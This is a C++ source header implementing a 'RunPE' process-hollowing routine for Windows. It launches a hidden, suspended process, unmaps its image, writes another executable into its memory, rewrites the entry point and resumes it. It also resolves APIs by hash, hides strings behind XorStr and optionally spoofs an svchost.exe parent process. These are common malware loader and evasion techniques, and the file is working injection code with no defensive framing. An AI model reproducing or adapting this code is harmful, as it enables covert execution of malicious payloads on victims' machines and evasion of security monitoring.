#pragma once

#include "main.h"
#include <Windows.h>
#include <iostream>

#ifdef _WIN64
#define WIN64
#endif

#include "getprocaddress.h"
 
int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
{
	HMODULE(WINAPI * pLoadLibraryA)(LPCSTR lpLibFileName) = 0;
	VOID(WINAPI * pExitProcess)(UINT uExitCode) = 0;
	DWORD(WINAPI * pGetModuleFileNameW)(__in_opt HMODULE hModule, __out_ecount_part(nSize, return +1) LPWSTR lpFilename, __in DWORD nSize) = 0;
	BOOL(WINAPI * pCreateProcessW) (__in_opt    LPCWSTR lpApplicationName, __inout_opt LPWSTR lpCommandLine, __in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes, __in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes, __in        BOOL bInheritHandles, __in        DWORD dwCreationFlags, __in_opt    LPVOID lpEnvironment, __in_opt    LPCWSTR lpCurrentDirectory, __in        LPSTARTUPINFOW lpStartupInfo, __out       LPPROCESS_INFORMATION lpProcessInformation);
	BOOL(WINAPI * pGetThreadContext) (__in    HANDLE hThread, __inout LPCONTEXT lpContext);
	NTSTATUS(NTAPI * pNtUnmapViewOfSection)(HANDLE ProcessHandle, LPVOID BaseAddress);
	HMODULE(WINAPI * pGetModuleHandleW)(__in_opt LPCWSTR lpModuleName);
	LPVOID(WINAPI * pVirtualAllocEx)(__in     HANDLE hProcess, __in_opt LPVOID lpAddress, __in     SIZE_T dwSize, __in     DWORD flAllocationType, __in     DWORD flProtect);
	BOOL(WINAPI * pWriteProcessMemory)(__in      HANDLE hProcess, __in      LPVOID lpBaseAddress, __in_bcount(nSize) LPCVOID lpBuffer, __in      SIZE_T nSize, __out_opt SIZE_T * lpNumberOfBytesWritten);
	NTSTATUS(NTAPI * pNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
	BOOL(WINAPI * pSetThreadContext)(__in HANDLE hThread, __in CONST CONTEXT * lpContext);
	DWORD(WINAPI * pResumeThread)(__in HANDLE hThread);
	BOOL(WINAPI * pCloseHandle)(__in HANDLE hObject);
	BOOL(WINAPI * pVirtualFree)(__in LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD dwFreeType);
	BOOL(WINAPI * pTerminateProcess)(__in HANDLE hProcess, __in UINT uExitCode);
	LPWSTR(WINAPI * pGetCommandLineW)(VOID);
	LPVOID(WINAPI * pVirtualAlloc)(__in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect); 
	DWORD(WINAPI * pGetProcessId)(__in HANDLE Process); 

	hKernel32 = get_kernel32base();
	hNtdll = get_ntdllbase();

	*(DWORD_PTR*)&pLoadLibraryA = get_proc_address(hKernel32, 0x8a8b4676);
	*(DWORD_PTR*)&pExitProcess = (DWORD_PTR)ExitProcess; // get_proc_address(hKernel32, 0x12dfcc4e);
	*(DWORD_PTR*)&pGetModuleFileNameW = (DWORD_PTR)GetModuleFileNameW; // get_proc_address(hKernel32, 0xf3cf5f6f);
	*(DWORD_PTR*)&pCreateProcessW = (DWORD_PTR)CreateProcessW; //get_proc_address(hKernel32, 0xb4f0f46f);
	*(DWORD_PTR*)&pGetThreadContext = (DWORD_PTR)GetThreadContext; //get_proc_address(hKernel32, 0xf7643b99);
	*(DWORD_PTR*)&pNtUnmapViewOfSection = get_proc_address(hNtdll, 0x98acab94);
	*(DWORD_PTR*)&pGetModuleHandleW = (DWORD_PTR)GetModuleHandleW; //get_proc_address(hKernel32, 0x61eebd02);
	*(DWORD_PTR*)&pVirtualAllocEx = (DWORD_PTR)VirtualAllocEx; //get_proc_address(hKernel32, 0x0dd78764);
	*(DWORD_PTR*)&pWriteProcessMemory = (DWORD_PTR)WriteProcessMemory; //get_proc_address(hKernel32, 0x6659de75);
	*(DWORD_PTR*)&pNtQueryInformationProcess = get_proc_address(hNtdll, 0x339c09fb);
	*(DWORD_PTR*)&pSetThreadContext = (DWORD_PTR)SetThreadContext; //get_proc_address(hKernel32, 0x77643b9b);
	*(DWORD_PTR*)&pResumeThread = (DWORD_PTR)ResumeThread; //get_proc_address(hKernel32, 0x3cc73360);
	*(DWORD_PTR*)&pCloseHandle = (DWORD_PTR)CloseHandle; //get_proc_address(hKernel32, 0xae7a8bda);
	*(DWORD_PTR*)&pVirtualFree = (DWORD_PTR)VirtualFree; //get_proc_address(hKernel32, 0xe183277b);
	*(DWORD_PTR*)&pTerminateProcess = (DWORD_PTR)TerminateProcess; //get_proc_address(hKernel32, 0x07722b4b);
	*(DWORD_PTR*)&pGetCommandLineW = (DWORD_PTR)GetCommandLineW; //get_proc_address(hKernel32, 0xc56e656d);
	*(DWORD_PTR*)&pVirtualAlloc = (DWORD_PTR)VirtualAlloc; //get_proc_address(hKernel32, 0x302ebe1c);
	*(DWORD_PTR*)&pGetProcessId = get_proc_address(hKernel32, 0xba190f77);   
 
	//https://stackoverflow.com/questions/46380166/getthreadcontext-returning-87 
	CONTEXT CTX;	
	memset(&CTX, 0, sizeof(CONTEXT));	

	PROCESS_BASIC_INFORMATION PBI;
	memset(&PBI, 0, sizeof(PROCESS_BASIC_INFORMATION));

	CTX.ContextFlags = (WOW64_CONTEXT_SEGMENTS | WOW64_CONTEXT_CONTROL | WOW64_CONTEXT_INTEGER);
	LPVOID lpImageBase;
	ULONG RetSize;
	//DWORD pid;
	PIMAGE_DOS_HEADER IDH = (PIMAGE_DOS_HEADER)lpFile;
	
	std::wstring wstrCmdLine(GetCommandLineW());
	wstrCmdLine.erase(0, wstrCmdLine.find(L" ")); 
	printfdbg("CmdLine %ls\n",wstrCmdLine.c_str()); 
	std::wstring concatted_stdstr = std::wstring(path) + L" " + wstrCmdLine;
	LPWSTR concatted = (LPWSTR)concatted_stdstr.c_str();
	
#ifndef WIN64
	PIMAGE_NT_HEADERS INH = (PIMAGE_NT_HEADERS)((DWORD)lpFile + IDH->e_lfanew);
#else
	PIMAGE_NT_HEADERS INH = (PIMAGE_NT_HEADERS)((DWORD64)lpFile + IDH->e_lfanew);
#endif
	PIMAGE_SECTION_HEADER ISH = ((PIMAGE_SECTION_HEADER)((ULONG_PTR)(INH)+((LONG)(LONG_PTR) & (((IMAGE_NT_HEADERS*)0)->OptionalHeader)) + ((INH))->FileHeader.SizeOfOptionalHeader));

	PROCESS_INFORMATION PI;
	memset(&PI, 0, sizeof(PROCESS_INFORMATION));
	
	PVOID oldValue;
	Wow64DisableWow64FsRedirection(&oldValue);
	
#ifdef PPID 
	STARTUPINFOEXW SI; 
	memset(&SI, 0, sizeof(STARTUPINFOEXW));
	
	SIZE_T attributeSize;
		 
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(SI.lpAttributeList, 1, 0, &attributeSize);
	
	DWORD PID = FindProcByName((char*)XorStr("svchost.exe"));  
	printfdbg("FindProcByName %d\n", PID); 
	HANDLE parentProcessHandle = OpenProcess(
		PROCESS_ALL_ACCESS, //MAXIMUM_ALLOWED
		false,
		PID);
	 
	 if (parentProcessHandle) {
	printfdbg(XorStr("Open parent process OK: %d\n"), parentProcessHandle);

	UpdateProcThreadAttribute(
		SI.lpAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&parentProcessHandle,
		sizeof(HANDLE),
		NULL,
		NULL);
		  
	 } else
	 printfdbg(XorStr("Open parent process error %s\n"), GetLastErrorAsText());
	 
	SI.StartupInfo.cb = sizeof(STARTUPINFOEXW);
	 
	if (pCreateProcessW(NULL, concatted, NULL, NULL, NULL,  
	EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI.StartupInfo, &PI))

#else //PPID 
	STARTUPINFOW SI;  
	memset(&SI, 0, sizeof(STARTUPINFOW));

	if (pCreateProcessW(NULL, concatted, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))

#endif //PPID
	{
		//pid = pGetProcessId(PI.hProcess); 
		printfdbg(XorStr("PID %x\n"),pGetProcessId(PI.hProcess));
		if (pGetThreadContext(PI.hThread, &CTX))
		{
			pNtUnmapViewOfSection(PI.hProcess, pGetModuleHandleW(NULL));
			if (lpImageBase = pVirtualAllocEx(PI.hProcess, (LPVOID)INH->OptionalHeader.ImageBase, INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
			{
				if (pWriteProcessMemory(PI.hProcess, lpImageBase, lpFile, INH->OptionalHeader.SizeOfHeaders, NULL))
				{
					for (int iSection = 0; iSection < INH->FileHeader.NumberOfSections; iSection++)
					{ 
#ifndef WIN64
						pWriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)lpImageBase + ISH[iSection].VirtualAddress), (LPVOID)((DWORD)lpFile + ISH[iSection].PointerToRawData), ISH[iSection].SizeOfRawData, NULL);
#else
						pWriteProcessMemory(PI.hProcess, LPVOID(DWORD64(lpImageBase) + ISH[iSection].VirtualAddress), LPVOID(DWORD64(lpFile) + ISH[iSection].PointerToRawData), ISH[iSection].SizeOfRawData, NULL);
#endif
					}
					if (!pNtQueryInformationProcess(PI.hProcess, (PROCESSINFOCLASS)0, &PBI, sizeof(PBI), &RetSize))
					{
#ifndef WIN64
						if (pWriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)PBI.PebBaseAddress + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
#else
						if (pWriteProcessMemory(PI.hProcess, LPVOID(DWORD64(PBI.PebBaseAddress) + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
#endif
						{
#ifndef WIN64
							CTX.Eax = (DWORD)lpImageBase + INH->OptionalHeader.AddressOfEntryPoint;
#else
							CTX.Rcx = (DWORD64)lpImageBase + INH->OptionalHeader.AddressOfEntryPoint;
#endif
							if (pSetThreadContext(PI.hThread, &CTX))
							{
								if (pResumeThread(PI.hThread))
								{ 
									pCloseHandle(PI.hProcess);
									pCloseHandle(PI.hThread);
									//pExitProcess(0);
									return 0; 
								
								} 
								else printfdbg(XorStr("Error resuming thread\r\n"));

							} else printfdbg(XorStr("Error setting context\r\n"));

						}

					} else printfdbg(XorStr("Error pNtQueryInformationProcess\n"));

				}
				else printfdbg(XorStr("Error writing memory %s\r\n"),GetLastErrorAsText());
 
			}else printfdbg(XorStr("Error allocating memory %s\r\n"),GetLastErrorAsText());
			system("pause");
		}
		else printfdbg(XorStr("Error getting context %s\r\n"), GetLastErrorAsText());

	} else printfdbg(XorStr("Error creating process %s\r\n"),GetLastErrorAsText());

	#ifdef PPID
	if (parentProcessHandle) CloseHandle(parentProcessHandle);
	#endif
	
	Wow64RevertWow64FsRedirection(&oldValue);
	
	if (PI.hProcess)
	{
		//	cout << "PI.hProcess)" << endl;
		pTerminateProcess(PI.hProcess, 0);
		pCloseHandle(PI.hProcess);
		return -1;
	}
	//if (PI.hThread) pCloseHandle(PI.hThread);
	//pExitProcess(0);
	return -1;
}

 




